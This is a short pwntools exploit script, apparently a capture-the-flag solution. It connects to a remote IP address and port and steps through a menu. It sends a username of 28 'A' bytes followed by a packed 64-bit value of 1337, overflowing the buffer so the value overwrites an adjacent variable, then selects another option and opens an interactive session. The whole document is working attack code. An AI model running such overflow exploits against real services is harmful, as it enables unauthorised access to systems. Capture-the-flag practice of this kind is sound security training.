from pwn import *

context(arch='amd64', os='linux', log_level='debug')
r = remote('34.123.210.162', 20232)
r.recvuntil(b'Choice: ')
r.sendline(b'1')
r.recvuntil(b'Enter new username: ')
r.sendline(b'A'*28+p64(1337))
r.recvuntil(b'Choice: ')
r.sendline(b'3')
r.interactive()
